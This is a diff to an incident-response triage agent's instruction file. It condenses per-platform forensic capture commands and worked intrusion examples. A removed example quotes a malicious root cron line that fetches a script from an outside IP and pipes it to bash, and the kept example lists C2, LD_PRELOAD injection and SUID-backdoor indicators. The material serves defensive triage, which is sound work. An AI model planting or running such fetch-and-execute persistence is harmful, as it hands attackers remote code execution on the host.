@@ -220,219 +220,26 @@ Produce `triage-findings.md` with:
 
 ## Multi-Platform Triage
 
-Adapt triage commands to the target platform. The volatility order and escalation triggers remain identical across platforms — only the tools change.
+Adapt triage commands to the target platform. The volatility order and the eight escalation triggers above remain identical across platforms — only the tools change. The exact per-platform capture command sequences are externalized.
 
-### Windows Triage (WMI/PowerShell)
+> Detailed per-platform capture command sequences: see `docs/agent-examples/triage-agent-playbook.md` (`aiwg discover "triage agent detection playbook"`).
 
-Capture volatile state via PowerShell. Run these in order, saving output to a timestamped directory.
+- **Windows (WMI/PowerShell)** — process list with parent PIDs, `Get-NetTCPConnection` (≈ `ss -tunap`), processes with no disk-resident binary, Security event log (4624/4625/4648/4672/4698/4720), registry Run keys, services, PowerShell history/transcripts. **Windows-specific red flags**: services running from `%TEMP%`/`%APPDATA%`; scheduled tasks added within the investigation window; unsigned drivers (`driverquery /v`).
+- **macOS (SSH)** — time anchor, `ps auxwwef`, `launchctl list` + LaunchAgents/LaunchDaemons plist sources, `netstat`/`arp`, unified-log security/auth events, `kextstat`, login items. **macOS-specific red flags**: kexts without an Apple Team ID; LaunchDaemon/LaunchAgent plists with `RunAtLoad = true` pointing to `/tmp` or home dirs; `fs_usage` high-frequency writes to unusual locations.
+- **Cloud (API-based, read-only)** — AWS (SSM Run Command, describe-instances, CloudWatch CPU, CloudTrail lookups, security-group-change events), Azure (Run Command, activity log, instance view), GCP (compute ssh capture, instances describe, audit log read). **Cloud-specific red flags**: IAM role assumption immediately before the incident window; security-group/firewall changes opening inbound; service-account key creation in the incident window; VPC flow logs showing unexpected outbound volume.
 
-```powershell
-# Process list with full command lines and parent PIDs
-Get-Process | Select-Object Id, ProcessName, Path, CPU, WorkingSet, StartTime | Sort-Object CPU -Descending
+## Few-Shot Example
 
-# Network state — equivalent to ss -tunap
-Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess |
-  Where-Object { $_.State -eq 'Established' }
+### Active Intrusion with Multiple Red Flags (anchor)
 
-# Processes with no disk-resident binary (equivalent to /proc/*/exe deleted check)
-Get-Process | Where-Object { $_.Path -eq $null } | Select-Object Id, ProcessName, CPU
+- Red Flag 5: `/proc/24891/exe -> /tmp/.x (deleted)` — process running from /tmp with deleted binary
+- Red Flag 4: `ss -tunap` shows PID 24891 ESTABLISHED to 91.108.4.12:443
+- Red Flag 7: `/proc/24891/environ` contains `LD_PRELOAD=/tmp/.libcache.so`
+- Red Flag 3: `/usr/bin/pkexec` SUID binary modified 2 hours ago (mtime newer than /etc/passwd)
 
-# Security event log — last 200 authentication events
-Get-WinEvent -LogName Security -MaxEvents 200 |
-  Where-Object { $_.Id -in 4624, 4625, 4648, 4672, 4698, 4720 } |
-  Select-Object TimeCreated, Id, Message
+**Classification**: Active. Established C2, LD_PRELOAD library injection, backdoored SUID binary. **ESCALATE** all four findings immediately. Do not proceed to acquisition without incident commander authorization.
 
-# Explicit auth failures and successes for privileged accounts
-Get-EventLog -LogName Security -InstanceId 4625 -Newest 50
-Get-EventLog -LogName Security -InstanceId 4624 -Newest 20
-
-# Registry persistence — Run keys (execute at logon)
-Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
-Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
-
-# Services — look for unsigned or recently installed
-Get-Service | Where-Object { $_.Status -eq 'Running' } |
-  Select-Object Name, DisplayName, Status, StartType
-
-# PowerShell command history (all users if running as admin)
-Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
-
-# PowerShell transcription logs (if transcription enabled via GPO)
-Get-ChildItem "$env:SystemDrive\PSTranscripts" -Recurse -ErrorAction SilentlyContinue | Select-Object FullName, LastWriteTime
-```
-
-**Windows-specific red flags**: Services running from `%TEMP%` or `%APPDATA%`; scheduled tasks added within the investigation window (`Get-ScheduledTask | Where-Object { $_.Date -gt (Get-Date).AddDays(-2) }`); unsigned drivers loaded via `driverquery /v`.
-
----
-
-### macOS Triage (SSH)
-
-macOS exposes volatile state through a mix of `launchctl`, the unified logging system, and BSD-inherited tools. Capture in this order.
-
-```bash
-# System time anchor
-date -u +"%Y-%m-%dT%H:%M:%SZ"
-
-# Running processes with command lines
-ps auxwwef
-
-# LaunchAgents and LaunchDaemons — persistence mechanisms
-launchctl list
-# Enumerate all plist sources
-ls -la ~/Library/LaunchAgents/ /Library/LaunchAgents/ /Library/LaunchDaemons/ /System/Library/LaunchDaemons/ 2>/dev/null
-
-# Network state
-netstat -anp tcp
-netstat -anp udp
-arp -an
-
-# Unified logging — last 30 minutes of security-relevant events
-log show --last 30m --predicate 'subsystem == "com.apple.security" OR subsystem == "com.apple.authorization"' --info
-
-# SSH and sudo events from unified log
-log show --last 24h --predicate 'process == "sshd" OR process == "sudo"' --info | tail -100
-
-# Filesystem activity — requires elevated privileges, generates high volume; limit duration
-# fs_usage -t 10 2>/dev/null | grep -v dtrace | head -200
-
-# Kernel extensions — look for unsigned or unexpected kexts
-kextstat | grep -v "com.apple"
-
-# Login items (user-level persistence)
-osascript -e 'tell application "System Events" to get the name of every login item'
-```
-
-**macOS-specific red flags**: Kexts without an Apple Team ID in `kextstat` output; LaunchDaemon or LaunchAgent plists with `RunAtLoad = true` pointing to paths in `/tmp` or user home directories; `fs_usage` showing high-frequency writes to unusual locations.
-
----
-
-### Cloud Triage (API-Based)
-
-Cloud instances do not always allow SSH access. Use the cloud provider's control-plane APIs to capture volatile state. API calls are read-only and do not modify the instance.
-
-#### AWS
-
-```bash
-# Instance metadata — identify target
-INSTANCE_ID="i-0abc123def456"
-REGION="us-east-1"
-
-# Running processes via SSM Run Command (no SSH required)
-aws ssm send-command \
-  --instance-ids "$INSTANCE_ID" \
-  --document-name "AWS-RunShellScript" \
-  --parameters commands='["ps auxwwef; ss -tunap; lsmod; ls -la /proc/*/exe 2>/dev/null | grep deleted"]' \
-  --region "$REGION"
-
-# Instance state and recent changes
-aws ec2 describe-instances --instance-ids "$INSTANCE_ID" --region "$REGION" \
-  --query 'Reservations[].Instances[].{State:State.Name,LaunchTime:LaunchTime,SecurityGroups:SecurityGroups}'
-
-# Performance metrics — CPU spike may indicate crypto mining or exfiltration
-aws cloudwatch get-metric-data \
-  --metric-data-queries '[{"Id":"cpu","MetricStat":{"Metric":{"Namespace":"AWS/EC2","MetricName":"CPUUtilization","Dimensions":[{"Name":"InstanceId","Value":"'$INSTANCE_ID'"}]},"Period":300,"Stat":"Average"}}]' \
-  --start-time "$(date -u -d '2 hours ago' +%Y-%m-%dT%H:%M:%SZ)" \
-  --end-time "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
-  --region "$REGION"
-
-# CloudTrail — API calls made by or against this instance in last 2 hours
-aws cloudtrail lookup-events \
-  --lookup-attributes AttributeKey=ResourceName,AttributeValue="$INSTANCE_ID" \
-  --start-time "$(date -u -d '2 hours ago' +%Y-%m-%dT%H:%M:%SZ)" \
-  --region "$REGION" | jq '.Events[] | {EventTime, EventName, Username: .Username, SourceIP: .CloudTrailEvent | fromjson | .sourceIPAddress}'
-
-# Security group changes — detect unauthorized firewall modifications
-aws cloudtrail lookup-events \
-  --lookup-attributes AttributeKey=EventName,AttributeValue=AuthorizeSecurityGroupIngress \
-  --start-time "$(date -u -d '24 hours ago' +%Y-%m-%dT%H:%M:%SZ)" \
-  --region "$REGION"
-```
-
-#### Azure
-
-```bash
-RESOURCE_GROUP="my-rg"
-VM_NAME="my-vm"
-SUBSCRIPTION="00000000-0000-0000-0000-000000000000"
-
-# Run volatile capture on VM (no SSH required via Run Command)
-az vm run-command invoke \
-  --resource-group "$RESOURCE_GROUP" \
-  --name "$VM_NAME" \
-  --command-id RunShellScript \
-  --scripts "ps auxwwef; ss -tunap; lsmod; ls -la /proc/*/exe 2>/dev/null | grep deleted"
-
-# Activity log — control-plane events last 2 hours
-az monitor activity-log list \
-  --resource-group "$RESOURCE_GROUP" \
-  --start-time "$(date -u -d '2 hours ago' +%Y-%m-%dT%H:%M:%SZ)" \
-  --query '[].{caller:caller,operation:operationName.localizedValue,status:status.localizedValue,time:eventTimestamp}' \
-  --output table
-
-# VM instance view — running extensions and power state
-az vm get-instance-view \
-  --resource-group "$RESOURCE_GROUP" \
-  --name "$VM_NAME" \
-  --query '{statuses:instanceView.statuses, extensions:instanceView.extensions}'
-```
-
-#### GCP
-
-```bash
-PROJECT="my-project"
-ZONE="us-central1-a"
-INSTANCE="my-vm"
-
-# Run volatile capture (no SSH via OS Login or IAP)
-gcloud compute ssh "$INSTANCE" --zone="$ZONE" --project="$PROJECT" \
-  --command="ps auxwwef; ss -tunap; lsmod; ls -la /proc/*/exe 2>/dev/null | grep deleted"
-
-# Instance description — metadata, service accounts, network
-gcloud compute instances describe "$INSTANCE" \
-  --zone="$ZONE" \
-  --project="$PROJECT" \
-  --format="json" | jq '{status, networkInterfaces, serviceAccounts, metadata, lastStartTimestamp}'
-
-# Audit logs — admin and data access events last 2 hours
-gcloud logging read \
-  "resource.type=gce_instance AND resource.labels.instance_id=$(gcloud compute instances describe $INSTANCE --zone=$ZONE --format='value(id)') AND timestamp>\"$(date -u -d '2 hours ago' +%Y-%m-%dT%H:%M:%SZ)\"" \
-  --project="$PROJECT" \
-  --format="json" | jq '.[] | {timestamp, severity, protoPayload: .protoPayload.methodName}'
-```
-
-**Cloud-specific red flags**: IAM role assumption events immediately before the incident window; security group or firewall rule modifications opening inbound access; service account key creation during the incident window; VPC flow logs showing unexpected outbound traffic volume.
-
----
-
-## Few-Shot Examples
-
-### Example 1: Historical Intrusion (Simple)
-
-**Scenario**: Investigate a server flagged for suspicious cron entries. No active attack in progress.
-
-**Triage result**:
-- No processes with deleted executables
-- No unusual kernel modules
-- `ss -tunap` shows only expected connections (SSH, HTTP, HTTPS)
-- `find / -xdev -newer /etc/passwd` reveals `/etc/cron.d/logrotate-bk` modified 6 days ago by root
-- Contents of that cron file: `* * * * * root curl -s http://185.220.101.47/x | bash`
-
-**Classification**: Historical. Attack completed 6 days ago. Attacker installed cron-based C2 beacon. No active session. Proceed to acquisition with cron persistence as top priority.
-
----
-
-### Example 2: Active Intrusion with Multiple Red Flags (Moderate)
-
-**Scenario**: Triage a web server showing CPU spike. Recon agent flagged an unrecognized service on port 8443.
-
-**Triage result**:
-- Red Flag 5 triggered: `/proc/24891/exe -> /tmp/.x (deleted)` — process running from /tmp with deleted binary
-- Red Flag 4 triggered: `ss -tunap` shows PID 24891 with ESTABLISHED connection to 91.108.4.12:443
-- Red Flag 7 triggered: `/proc/24891/environ` contains `LD_PRELOAD=/tmp/.libcache.so`
-- Red Flag 3 triggered: `/usr/bin/pkexec` — SUID binary — modified 2 hours ago (mtime newer than /etc/passwd)
-
-**Classification**: Active. Attacker has an established C2 channel, injected a library via LD_PRELOAD, and backdoored a SUID binary. **ESCALATE** all four findings immediately. Do not proceed to acquisition without incident commander authorization.
+> Additional worked examples (historical + active triage): see `docs/agent-examples/triage-agent-examples.md` (`aiwg discover "triage agent worked examples"`).
 
 ## References
 
